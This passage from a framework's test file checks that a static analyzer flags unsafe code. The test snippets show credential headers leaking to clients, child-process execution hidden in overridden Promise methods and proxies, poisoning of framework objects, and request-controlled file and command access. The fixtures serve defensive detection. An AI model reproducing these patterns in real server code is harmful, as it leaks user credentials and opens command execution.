  });

  it('propagates credential resolution through authored thenables and template tags', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      query({ async load(_input, { request }) {
        const auth = request.headers.get('authorization');
        const thenable = { then(resolve) { resolve(auth); } };
        return await thenable;
      } });
      query({ load(_input, { request }) {
        const auth = request.headers.get('authorization');
        function tag() { return auth; }
        return tag\`safe\`;
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
      ]),
    );
  });

  it('propagates credential resolution through Promise combinators and executors', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      query({ async load(_input, { request }) {
        const auth = request.headers.get('authorization');
        const thenable = { then(resolve) { execFileSync('promise-assimilation'); resolve(auth); } };
        return await Promise.all([thenable]);
      } });
      query({ async load(_input, { request }) {
        const auth = request.headers.get('authorization');
        return await new Promise((resolve) => resolve(auth));
      } });
    `);

    expect(
      facts.filter((fact) => fact.sink === 'client-wire.request.header.Authorization'),
      JSON.stringify(facts),
    ).toHaveLength(2);
    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'promise-assimilation'",
        }),
      ]),
    );
    expect(
      facts.filter(
        (fact) => fact.sink === 'request-handler.opaque-call' && fact.source === 'resolve',
      ),
    ).toEqual([]);
  });

  // SPEC §2 and §6.6 require request authority to stay AST-proven across implicit protocols.
  it('propagates Authorization through Object.fromEntries custom iterator output', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      query({ load(_input, { request }) {
        const entries = {
          *[Symbol.iterator]() {
            yield ['token', request.headers.get('authorization')];
          },
        };
        return Object.fromEntries(entries);
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
      ]),
    );
  });

  it('propagates Authorization through Array.fromAsync custom async iterator output', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      query({ async load(_input, { request }) {
        const values = {
          async *[Symbol.asyncIterator]() {
            yield request.headers.get('authorization');
          },
        };
        return await Array.fromAsync(values);
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
      ]),
    );
  });

  it('traverses Promise.resolve(...).then callbacks at request roots', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      query({ async load(input) {
        return await Promise.resolve(input.value).then((value) => {
          execFileSync('promise-then-callback');
          return value;
        });
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'promise-then-callback'",
        }),
      ]),
    );
  });

  it.each([
    [
      'direct descriptor replacement',
      `const promise = Promise.resolve('safe');
       Object.defineProperty(promise, 'then', {
         value(onFulfilled) {
           execFileSync('promise-own-then-direct');
           return Promise.resolve(onFulfilled('safe'));
         },
       });`,
      'promise-own-then-direct',
    ],
    [
      'helper-installed descriptor replacement',
      `function install(promise) {
         Object.defineProperty(promise, 'then', {
           value(onFulfilled) {
             execFileSync('promise-own-then-helper');
             return Promise.resolve(onFulfilled('safe'));
           },
         });
       }
       const promise = Promise.resolve('safe');
       install(promise);`,
      'promise-own-then-helper',
    ],
    [
      'constructor-installed descriptor replacement',
      `class InstallThen {
         constructor(promise) {
           Object.defineProperty(promise, 'then', {
             value(onFulfilled) {
               execFileSync('promise-own-then-new');
               return Promise.resolve(onFulfilled('safe'));
             },
           });
         }
       }
       const promise = Promise.resolve('safe');
       new InstallThen(promise);`,
      'promise-own-then-new',
    ],
    [
      'tag-installed descriptor replacement',
      `function installThen(_parts, promise) {
         Object.defineProperty(promise, 'then', {
           value(onFulfilled) {
             execFileSync('promise-own-then-tag');
             return Promise.resolve(onFulfilled('safe'));
           },
         });
         return promise;
       }
       const nativePromise = Promise.resolve('safe');
       const promise = installThen\`install:\${nativePromise}\`;`,
      'promise-own-then-tag',
    ],
  ])('rejects a hostile Promise own then via %s', (_label, setup, marker) => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      query({ async load() {
        ${setup}
        return await promise.then((value) => value);
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: `'${marker}'`,
        }),
      ]),
    );
  });

  it('rejects a hostile Promise own then installed by a local JSX component', () => {
    const facts = sinksFor(`
      /** @jsxImportSource @kovojs/server */
      import { execFileSync } from 'node:child_process';
      import { route } from '@kovojs/server';
      function InstallThen({ promise }) {
        Object.defineProperty(promise, 'then', {
          value(onFulfilled) {
            execFileSync('promise-own-then-jsx');
            return Promise.resolve(onFulfilled('safe'));
          },
        });
        return <span>installed</span>;
      }
      route('/', { async page() {
        const promise = Promise.resolve('safe');
        const view = <InstallThen promise={promise} />;
        await promise.then((value) => value);
        return view;
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'promise-own-then-jsx'",
        }),
      ]),
    );
  });

  it('propagates credential values yielded by authored iterators', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      function iterator(request) {
        return { *[Symbol.iterator]() { yield request.headers.get('authorization'); } };
      }
      query({ load(_input, { request }) {
        for (const token of iterator(request)) return token;
        return null;
      } });
      query({ load(_input, { request }) {
        const [token] = iterator(request);
        return token;
      } });
      query({ load(_input, { request }) {
        return [...iterator(request)];
      } });
      query({ load(_input, { request }) {
        const [character] = \`token:\${request.headers.get('authorization')}\`;
        return character;
      } });
      query({ load(_input, { request }) {
        for (const character of \`token:\${request.headers.get('authorization')}\`) return character;
        return null;
      } });
      query({ load(_input, { request }) {
        return [...\`token:\${request.headers.get('authorization')}\`];
      } });
    `);

    expect(
      facts.filter((fact) => fact.sink === 'client-wire.request.header.Authorization'),
      JSON.stringify(facts),
    ).toHaveLength(6);
  });

  it('fails closed for unreviewed public-wire expression syntax', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      query({ load() { return import.meta; } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.opaque-value' }),
      ]),
    );
  });

  it('preserves thrown credential provenance through catch bindings and local helpers', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      function reveal(request) {
        throw { nested: { token: request.headers.get('authorization') } };
      }
      query({ load(_input, { request }) {
        try {
          reveal(request);
          return 'unreachable';
        } catch ({ nested: { token } }) {
          return token;
        }
      } });
      query({ load(_input, { request }) {
        try {
          throw request.headers.get('authorization');
        } catch (caught) {
          return caught;
        }
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
      ]),
    );
  });

  it('traverses intrinsic JSX and local component props, children, closures, and execution', () => {
    const facts = sinksFor(`
      /** @jsxImportSource @kovojs/server */
      import { execFileSync } from 'node:child_process';
      import { route } from '@kovojs/server';
      function Card({ token, children }) {
        return <section data-token={token}>{children}</section>;
      }
      route('/', { page(_context, request) {
        const auth = request.headers.get('authorization');
        function ClosureLeak() {
          execFileSync('jsx-component-execution');
          return <span>{request.headers.get('authorization')}</span>;
        }
        return <Card token={auth}><ClosureLeak /></Card>;
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'jsx-component-execution'",
        }),
      ]),
    );
  });

  it('fails closed for unresolved package JSX components', () => {
    const facts = sinksFor(`
      /** @jsxImportSource @kovojs/server */
      import { route } from '@kovojs/server';
      import { ExternalCard } from 'external-components';
      route('/', { page() { return <ExternalCard value="safe" />; } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink: 'request-handler.opaque-source' })]),
    );
  });

  it('keeps retained createApp JSX component execution under the ordinary authority scan', () => {
    const local = sinksFor(`
      /** @jsxImportSource @kovojs/server */
      import { execFileSync } from 'node:child_process';
      import { createApp } from '@kovojs/server';
      function DocumentBody() {
        execFileSync('retained-jsx-component');
        return <main>document</main>;
      }
      createApp({ document: <html><body><DocumentBody /></body></html> });
    `);
    expect(local, JSON.stringify(local)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'retained-jsx-component'",
        }),
      ]),
    );

    const unresolved = sinksFor(`
      /** @jsxImportSource @kovojs/server */
      import { createApp } from '@kovojs/server';
      import { ExternalDocument } from 'external-components';
      createApp({ document: <ExternalDocument /> });
    `);
    expect(unresolved, JSON.stringify(unresolved)).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink: 'request-handler.opaque-source' })]),
    );
  });

  it('does not bless authored proxy values passed through component props', () => {
    const facts = sinksFor(`
      /** @jsxImportSource @kovojs/server */
      import { execFileSync } from 'node:child_process';
      import { route } from '@kovojs/server';
      const dangerous = new Proxy({}, {
        get() { execFileSync('jsx-proxy-prop'); return 'value'; },
      });
      function Render({ value }) { return <span>{String(value)}</span>; }
      route('/', { page() { return <Render value={dangerous} />; } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'request-handler.opaque-protocol' }),
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'jsx-proxy-prop'",
        }),
      ]),
    );
  });

  it('keeps credential predicates as server-side decisions while tracking result mutations', () => {
    const safe = sinksFor(`
      import { query } from '@kovojs/server';
      query({ load(_input, { request }) {
        const auth = request.headers.get('authorization');
        return {
          every: [1].every(() => Boolean(auth)),
          filter: [1].filter(() => Boolean(auth)),
          some: [1].some(() => Boolean(auth)),
        };
      } });
    `);
    expect(safe).toEqual([]);

    const booleanSafe = sinksFor(`
      import { and, eq, isNotNull } from 'drizzle-orm';
      import { query } from '@kovojs/server';
      const users = { id: {}, name: {} };
      export const byId = query({ load() {
        return { predicate: Boolean(and(eq(users.id, 'fixed'), isNotNull(users.name))) };
      } });
    `);
    expect(booleanSafe).toEqual([]);

    for (const source of [
      `import { and as combine, eq, isNotNull } from 'drizzle-orm';
       import { query } from '@kovojs/server';
       const users = { id: {}, name: {} };
       export const byId = query({ load() {
         return { predicate: Boolean(combine(eq(users.id, 'fixed'), isNotNull(users.name))) };
       } });`,
      `import * as drizzle from 'drizzle-orm';
       import { query } from '@kovojs/server';
       const users = { id: {}, name: {} };
       export const byId = query({ load() {
         return { predicate: Boolean(drizzle.and(
           drizzle.eq(users.id, 'fixed'), drizzle.isNotNull(users.name),
         )) };
       } });`,
    ]) {
      expect(sinksFor(source), source).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ sink: 'request-handler.opaque-package-call' }),
        ]),
      );
    }

    const unsafe = sinksFor(`
      import { query } from '@kovojs/server';
      query({ load(_input, { request }) {
        const auth = request.headers.get('authorization');
        const result = {};
        Object.assign(result, { auth });
        return result;
      } });
    `);
    expect(unsafe, JSON.stringify(unsafe)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
      ]),
    );
  });

  it('keeps canonical file responses, streams, and storage capabilities open', () => {
    const facts = sinksFor(`
      import { endpoint, respond } from '@kovojs/server';

      export const safe = endpoint('/safe', {
        async handler(_request, context) {
          await context.storage.get('fixed-key');
          if (context.stream) {
            return respond.stream(context.stream, { contentType: 'text/plain' });
          }
          return respond.stream(new ReadableStream({
            start(controller) {
              controller.enqueue(new TextEncoder().encode('safe'));
              controller.close();
            },
          }), { contentType: 'text/plain' });
        },
      });
    `);

    expect(facts).toEqual([]);
  });

  it('keeps Web stream intrinsic identities and controller methods finite', () => {
    for (const source of [
      `
        import { endpoint, respond } from '@kovojs/server';
        class ReadableStream { constructor(source) { source.start({ enqueue() {}, close() {} }); } }
        endpoint('/x', { handler() { return respond.stream(new ReadableStream({
          start(controller) { controller.enqueue('x'); controller.close(); },
        }), { contentType: 'text/plain' }); } });
      `,
      `
        import { execFileSync } from 'node:child_process';
        import { endpoint, respond } from '@kovojs/server';
        const TextEncoder = class { encode() { return execFileSync('text-encoder-shadow'); } };
        endpoint('/x', { handler() { return respond.stream(new ReadableStream({
          start(controller) { controller.enqueue(new TextEncoder().encode('x')); controller.close(); },
        }), { contentType: 'text/plain' }); } });
      `,
      `
        import { execFileSync } from 'node:child_process';
        import { endpoint, respond } from '@kovojs/server';
        const encoderPrototype = TextEncoder.prototype;
        encoderPrototype.encode = function () { return execFileSync('encoder-prototype'); };
        endpoint('/x', { handler() { return respond.stream(new ReadableStream({
          start(controller) { controller.enqueue(new TextEncoder().encode('x')); controller.close(); },
        }), { contentType: 'text/plain' }); } });
      `,
      `
        import { endpoint, respond } from '@kovojs/server';
        endpoint('/x', { handler() { return respond.stream(new ReadableStream({
          start(controller) { controller['enqueue']('x'); controller.abort(); },
        }), { contentType: 'text/plain' }); } });
      `,
      `
        import { endpoint, respond } from '@kovojs/server';
        endpoint('/x', { handler() { return respond.stream(new ReadableStream({
          get start() { return (controller) => controller.close(); },
        }), { contentType: 'text/plain' }); } });
      `,
      `
        import { execFileSync } from 'node:child_process';
        import { endpoint, respond } from '@kovojs/server';
        endpoint('/x', { handler() { return respond.stream(new ReadableStream({
          start(controller, capability = { run: execFileSync }) {
            capability.run('stream-extra-parameter');
            controller.close();
          },
        }), { contentType: 'text/plain' }); } });
      `,
    ]) {
      expect(sinksFor(source).length, source).toBeGreaterThan(0);
    }
  });

  it('keeps privileged framework results off query and mutation public wires', () => {
    const facts = sinksFor(`
      import {
        cmd,
        commandAllowlist,
        mutation,
        query,
        respond,
        rootedFiles,
        runCommand,
      } from '@kovojs/server';
      const allow = commandAllowlist(['/usr/bin/true'], { justification: 'fixture' });
      const command = cmd('/usr/bin/true', [], { allow });
      export const commandOutput = mutation({ handler() { return runCommand(command); } });
      export const files = query({ async load() { return await rootedFiles('/secret'); } });
      export const fileOutcome = query({ load() {
        return respond.file('private', { contentType: 'text/plain' });
      } });
      export const streamOutcome = query({ load() {
        return respond.stream('private', { contentType: 'text/plain' });
      } });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'client-wire.request.opaque-value',
          source: 'runCommand(command)',
        }),
        expect.objectContaining({
          sink: 'client-wire.request.opaque-value',
          source: "rootedFiles('/secret')",
        }),
        expect.objectContaining({
          sink: 'client-wire.request.opaque-value',
          source: "respond.file('private', { contentType: 'text/plain' })",
        }),
        expect.objectContaining({
          sink: 'client-wire.request.opaque-value',
          source: "respond.stream('private', { contentType: 'text/plain' })",
        }),
      ]),
    );
  });

  it('keeps runCommand binding-pattern projections off public wires', () => {
    const facts = sinksFor(`
      import { cmd, commandAllowlist, mutation, runCommand } from '@kovojs/server';
      const allow = commandAllowlist(['/usr/bin/true'], { justification: 'fixture' });
      const command = cmd('/usr/bin/true', [], { allow });
      export const direct = mutation({ async handler() {
        const { stdout } = await runCommand(command);
        return stdout;
      } });
      export const aliased = mutation({ async handler() {
        const result = await runCommand(command);
        const { stdout } = result;
        return stdout;
      } });
    `);

    expect(
      facts.filter(
        (fact) =>
          fact.sink === 'client-wire.request.opaque-value' && fact.source === 'runCommand(command)',
      ),
      JSON.stringify(facts),
    ).toHaveLength(2);
  });

  it('accepts respond outcomes only as the whole route result', () => {
    const safe = sinksFor(`
      import { endpoint, notFound, respond } from '@kovojs/server';
      export const direct = endpoint('/direct', { handler() {
        return respond.file('direct', { contentType: 'text/plain' });
      } });
      export const conditional = endpoint('/conditional', { handler() {
        return true
          ? respond.file('file', { contentType: 'text/plain' })
          : respond.stream('stream', { contentType: 'text/plain' });
      } });
      export const missing = endpoint('/missing', { handler() { return notFound(); } });
    `);
    expect(safe).toEqual([]);

    const unsafe = sinksFor(`
      import { endpoint, respond } from '@kovojs/server';
      const identity = value => value;
      function download() {
        return respond.file('helper', { contentType: 'text/plain' });
      }
      export const object = endpoint('/object', { handler() {
        return { leak: respond.file('object', { contentType: 'text/plain' }) };
      } });
      export const array = endpoint('/array', { handler() {
        return [respond.stream('array', { contentType: 'text/plain' })];
      } });
      export const argument = endpoint('/argument', { handler() {
        return identity(respond.file('argument', { contentType: 'text/plain' }));
      } });
      export const alias = endpoint('/alias', { handler() {
        const outcome = respond.stream('alias', { contentType: 'text/plain' });
        return outcome;
      } });
      export const helper = endpoint('/helper', { handler() { return download(); } });
    `);
    expect(unsafe.filter((fact) => fact.sink === 'client-wire.request.opaque-value')).toHaveLength(
      5,
    );

    const shadowed = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { endpoint } from '@kovojs/server';
      const notFound = () => execFileSync('not-found-shadow');
      endpoint('/missing', { handler() { return notFound(); } });
    `);
    expect(shadowed.length).toBeGreaterThan(0);
  });

  it('rejects respond outcomes retained by a nested callback', () => {
    const facts = sinksFor(`
      import { endpoint, respond } from '@kovojs/server';
      let saved;
      export const route = endpoint('/retained', { handler() {
        const outcomes = [0].map(() =>
          respond.file('retained', { contentType: 'text/plain' }),
        );
        saved = outcomes[0];
        return Response.json({ ok: true });
      } });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: 'respond.file',
        }),
      ]),
    );
  });

  it.each([
    [
      'guards conditional container',
      `import { guards, query } from '@kovojs/server';
       const alias = ({ carrier: true ? guards : guards }).carrier;
       alias.authed = () => () => true;
       export const unsafe = query({
         access: [guards.authed()],
         load() { return { ok: true }; },
       });`,
      'request-handler.opaque-source',
      '<dynamic-callback>',
    ],
    [
      'guards helper return',
      `import { guards, query } from '@kovojs/server';
       const alias = (() => true && guards)();
       alias.authed = () => () => true;
       export const unsafe = query({
         access: [guards.authed()],
         load() { return { ok: true }; },
       });`,
      'request-handler.opaque-source',
      '<dynamic-callback>',
    ],
    [
      'respond conditional container',
      `import { endpoint, respond } from '@kovojs/server';
       const alias = [false || respond][0];
       alias.file = () => 'unsafe';
       export const unsafe = endpoint('/x', { handler() {
         return respond.file('safe', { contentType: 'text/plain' });
       } });`,
      'request-handler.opaque-call',
      'respond.file',
    ],
    [
      'respond helper return',
      `import { endpoint, respond } from '@kovojs/server';
       const alias = (() => (0, respond))();
       alias.file = () => 'unsafe';
       export const unsafe = endpoint('/x', { handler() {
         return respond.file('safe', { contentType: 'text/plain' });
       } });`,
      'request-handler.opaque-call',
      'respond.file',
    ],
    [
      'guards class field',
      `import { guards, query } from '@kovojs/server';
       class Poisoner {
         target = guards;
         run() { this.target.authed = () => () => true; }
       }
       new Poisoner().run();
       export const unsafe = query({
         access: [guards.authed()],
         load() { return { ok: true }; },
       });`,
      'request-handler.opaque-source',
      '<dynamic-callback>',
    ],
    [
      'respond class field',
      `import { endpoint, respond } from '@kovojs/server';
       class Poisoner {
         target = respond;
         run() { this.target.file = () => 'unsafe'; }
       }
       new Poisoner().run();
       export const unsafe = endpoint('/x', { handler() {
         return respond.file('safe', { contentType: 'text/plain' });
       } });`,
      'request-handler.opaque-call',
      'respond.file',
    ],
  ])('rejects exact carrier mutation through %s', (_label, source, sink, factSource) => {
    const facts = sinksFor(source);
    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink, source: factSource })]),
    );
  });

  it('does not grant generic capability authority to mutable framework carriers or results', () => {
    for (const mutation of [
      `respond.file = hostile;`,
      `const alias = respond; alias.file = hostile;`,
      `Object.defineProperty(respond, 'file', { value: hostile });`,
      `Object.setPrototypeOf(respond, { file: hostile });`,
    ]) {
      const facts = sinksFor(`
        import { execFileSync } from 'node:child_process';
        import { endpoint, respond } from '@kovojs/server';
        const hostile = () => { execFileSync('respond-hostile'); return 'unsafe'; };
        ${mutation}
        export const unsafe = endpoint('/unsafe', {
          handler() { return respond.file('safe', { contentType: 'text/plain' }); },
        });
      `);
      expect(facts.length).toBeGreaterThan(0);
    }

    const functionObject = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { component, query } from '@kovojs/server';
      component.pwn = () => execFileSync('component-function-object');
      export const unsafe = query({ load() { return component.pwn(); } });
    `);
    expect(functionObject).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'request-handler.opaque-call', source: 'component.pwn' }),
      ]),
    );

    const componentResult = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { component, query } from '@kovojs/server';
      const descriptor = component({ render: () => '<main>safe</main>' });
      descriptor.pwn = () => execFileSync('component-result');
      export const unsafe = query({ load() { return descriptor.pwn(); } });
    `);
    expect(componentResult).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: 'descriptor.pwn',
        }),
      ]),
    );

    const attrsResult = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      import * as style from '@kovojs/style';
      const attributes = style.attrs('safe');
      attributes.pwn = () => execFileSync('attrs-result');
      export const unsafe = query({ load() { return attributes.pwn(); } });
    `);
    expect(attrsResult).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: 'attributes.pwn',
        }),
      ]),
    );
  });

  it('closes request-minted framework filesystem, storage, and command authority', () => {
    const facts = sinksFor(`
      import * as server from '@kovojs/server';
      import {
        cmd,
        commandAllowlist,
        createFileSystemStorage,
        createS3CompatibleStorage,
        mutation,
        rootedFiles,
        runCommand,
      } from '@kovojs/server';

      export const unsafe = mutation({
        async handler(input) {
          await rootedFiles(input.root);
          createFileSystemStorage({ root: input.root });
          createS3CompatibleStorage(input.storage);
          const allow = commandAllowlist([input.program], { justification: 'dynamic program' });
          runCommand(cmd(input.program, input.argv, { allow }));
          return server[input.exportName];
        },
      });
    `);

    expect(facts.map((fact) => fact.sink)).toEqual(
      expect.arrayContaining([
        '@kovojs/core.createFileSystemStorage',
        '@kovojs/core.createS3CompatibleStorage',
        '@kovojs/server.[computed]',
        '@kovojs/server.cmd',
        '@kovojs/server.commandAllowlist',
        '@kovojs/server.rootedFiles',
      ]),
    );
  });

  it('keeps module-scope literal framework authority and audited terminal capabilities open', () => {
    const facts = sinksFor(`
      import {
        cmd,
        commandAllowlist,
        createFileSystemStorage,
        mutation,
        rootedFiles,
        runCommand,
      } from '@kovojs/server';

      const files = rootedFiles('/srv/kovo/files');
      const storage = createFileSystemStorage({ root: '/srv/kovo/storage' });
      const allow = commandAllowlist(['/usr/bin/true'], { justification: 'fixed probe' });
      const command = cmd('/usr/bin/true', [], { allow });

      export const safe = mutation({
        async handler() {
          await files;
          await storage.get('fixed-key');
          await runCommand(command);
          return { ok: true };
        },
      });
    `);

    expect(facts).toEqual([]);
  });

  it('accepts only a pristine module-scope rootedFiles handle as a direct route outcome', () => {
    const safe = sinksFor(`
      import { createApp, publicAccess, rootedFiles, route } from '@kovojs/server';
      const docs = await rootedFiles('/srv/kovo/docs');
      export default createApp({ routes: [route('/docs', {
        access: publicAccess('public docs'),
        page: () => docs.serve('readme.txt'),
      })] });
    `);
    expect(safe).toEqual([]);

    for (const source of [
      `export { docs };`,
      `const alias = docs; void alias;`,
      `docs.serve = () => new Response('forged');`,
      `Object.defineProperty(docs, 'serve', { value: () => new Response('forged') });`,
    ]) {
      const facts = sinksFor(`
        import { createApp, publicAccess, rootedFiles, route } from '@kovojs/server';
        const docs = await rootedFiles('/srv/kovo/docs');
        ${source}
        export default createApp({ routes: [route('/docs', {
          access: publicAccess('public docs'),
          page: () => docs.serve('readme.txt'),
        })] });
      `);
      expect(facts.length, source).toBeGreaterThan(0);
    }
  });

  it('closes factories, object methods, class methods, and higher-order parameter calls', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { mutation } from '@kovojs/server';

      function makeRunner() {
        return (value) => execFileSync(value);
      }
      const helpers = {
        run(value) { return execFileSync(value); },
      };
      class Runner {
        run(value) { return execFileSync(value); }
      }
      const runner = new Runner();
      function invoke(callback, value) {
        return callback(value);
      }

      export const unsafe = mutation({ handler(input) {
        makeRunner()(input.value);
        helpers.run(input.value);
        runner.run(input.value);
        helpers[input.method](input.value);
        return invoke(input.callback, input.value);
      } });
    `);

    expect(facts.filter((fact) => fact.sink === 'child_process.execFileSync')).toHaveLength(3);
    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: 'helpers[input.method]',
        }),
        expect.objectContaining({ sink: 'request-handler.opaque-call', source: 'callback' }),
      ]),
    );
  });

  it('keeps reviewed intrinsic callbacks, request methods, and framework capabilities open', () => {
    const facts = sinksFor(`
      import { createFileSystemStorage, endpoint, respond } from '@kovojs/server';

      const storage = createFileSystemStorage({ root: '/srv/kovo/storage' });
      export const safe = endpoint('/safe', { async handler(request, context) {
        const body = await request.text();
        const normalized = [body].map((value) => String(value).trim());
        const encoded = JSON.stringify({ normalized });
        await storage.get('fixed-key');
        await context.actAs('reviewed-principal');
        return encoded.length > 0
          ? respond.file('safe', { contentType: 'text/plain' })
          : Response.json({ ok: true });
      } });
    `);

    expect(facts).toEqual([]);
  });

  it('accepts only an exact mutation request scheduling a pristine local task with plain input', () => {
    const safe = sinksFor(`
      import { mutation, s, task } from '@kovojs/server';

      export const reconcile = task('orders/reconcile', {
        input: s.object({ id: s.string() }),
        async run(_input) {},
      });
      export const enqueue = mutation({
        input: s.object({ id: s.string() }),
        async handler(input, request) {
          await request.schedule(reconcile, { id: \`${'${input.id}'}-job\` });
          await request.schedule(reconcile, { id: input.id }, {
            afterMs: 10,
            coalesce: 'debounce',
            key: \`reconcile:${'${input.id}'}\`,
          });
          const handle = await request.schedule(reconcile, { id: input.id }, { afterMs: 20 });
          return { cancelled: await request.cancel(handle) };
        },
      });
    `);
    expect(safe).toEqual([]);

    const unsafeSources = [
      `
        import { mutation, s, task } from '@kovojs/server';
        const reconcile = task('orders/reconcile', { input: s.object({ id: s.string() }), async run() {} });
        const alias = reconcile;
        mutation({ input: s.object({ id: s.string() }), async handler(input, request) {
          await request.schedule(alias, { id: input.id });
          return { ok: true };
        } });
      `,
      `
        import { mutation, s, task } from '@kovojs/server';
        const reconcile = task('orders/reconcile', { input: s.object({ id: s.string() }), async run() {} });
        (reconcile as any).run = async () => {};
        mutation({ input: s.object({ id: s.string() }), async handler(input, request) {
          await request.schedule(reconcile, { id: input.id });
          return { ok: true };
        } });
      `,
      `
        import { mutation, s, task } from '@kovojs/server';
        const reconcile = task('orders/reconcile', { input: s.object({ id: s.string() }), async run() {} });
        mutation({ input: s.object({ id: s.string(), method: s.string() }), async handler(input, request) {
          await request[input.method](reconcile, { id: input.id });
          return { ok: true };
        } });
      `,
      `
        import { mutation, s, task } from '@kovojs/server';
        const reconcile = task('orders/reconcile', { input: s.object({ id: s.string() }), async run() {} });
        mutation({ input: s.object({ id: s.string() }), async handler(input, request) {
          const scheduler = request;
          await scheduler.schedule(reconcile, { id: input.id });
          return { ok: true };
        } });
      `,
      `
        import { mutation, s, task } from '@kovojs/server';
        const reconcile = task('orders/reconcile', { input: s.object({ id: s.string() }), async run() {} });
        mutation({ input: s.object({ id: s.string() }), async handler(input, request) {
          await request.schedule(reconcile, { id: input.id }, { onReady() {} });
          return { ok: true };
        } });
      `,
      `
        import { mutation, s, task } from '@kovojs/server';
        const reconcile = task('orders/reconcile', { input: s.object({ id: s.string() }), async run() {} });
        mutation({ input: s.object({ id: s.string() }), async handler(input, request) {
          await request.schedule(reconcile, { id: input.id }, { afterMs: 1, at: 2 });
          return { ok: true };
        } });
      `,
      `
        import { mutation, s, task } from '@kovojs/server';
        const reconcile = task('orders/reconcile', { input: s.object({ id: s.string() }), async run() {} });
        mutation({ input: s.object({ id: s.string() }), async handler(input, request) {
          const options = { afterMs: 1 };
          await request.schedule(reconcile, { id: input.id }, options);
          return { ok: true };
        } });
      `,
      `
        import { mutation, s, task } from '@kovojs/server';
        const reconcile = task('orders/reconcile', { input: s.object({ id: s.string() }), async run() {} });
        mutation({ input: s.object({ id: s.string() }), async handler(input, request) {
          const handle = { id: input.id, task: 'orders/reconcile' };
          return { cancelled: await request.cancel(handle) };
        } });
      `,
      `
        import { mutation, s, task } from '@kovojs/server';
        const reconcile = task('orders/reconcile', { input: s.object({ id: s.string() }), async run() {} });
        mutation({ input: s.object({ id: s.string() }), async handler(input, request) {
          let handle = await request.schedule(reconcile, { id: input.id });
          return { cancelled: await request.cancel(handle) };
        } });
      `,
      `
        import { mutation, s, task } from '@kovojs/server';
        const reconcile = task('orders/reconcile', { input: s.object({ id: s.string() }), async run() {} });
        mutation({ input: s.object({ id: s.string() }), async handler(input, request) {
          await request.schedule(reconcile, { id: input.id, run() {} });
          return { ok: true };
        } });
      `,
      `
        import { mutation, s, task } from '@kovojs/server';
        const reconcile = task('orders/reconcile', { input: s.object({ id: s.string() }), async run() {} });
        mutation({ input: s.object({ id: s.string() }), async handler(input, request) {
          await request.schedule(reconcile, { ...input });
          return { ok: true };
        } });
      `,
    ];
    for (const source of unsafeSources) {
      const facts = sinksFor(source);
      expect(facts.length, source).toBeGreaterThan(0);
    }
  });

  it('accepts only exact task composition through the direct framework task context', () => {
    const safe = sinksFor(`
      import { mutation, query, s, task } from '@kovojs/server';
      const attempts = new Map<string, number>();
      const record = mutation({
        input: s.object({ id: s.string() }),
        handler(input) { return { id: input.id }; },
      });
      const namedRecord = mutation('records/create', {
        input: s.object({ id: s.string() }),
        handler(input) { return { id: input.id }; },
      });
      const inspect = query({
        args: s.object({ id: s.string() }),
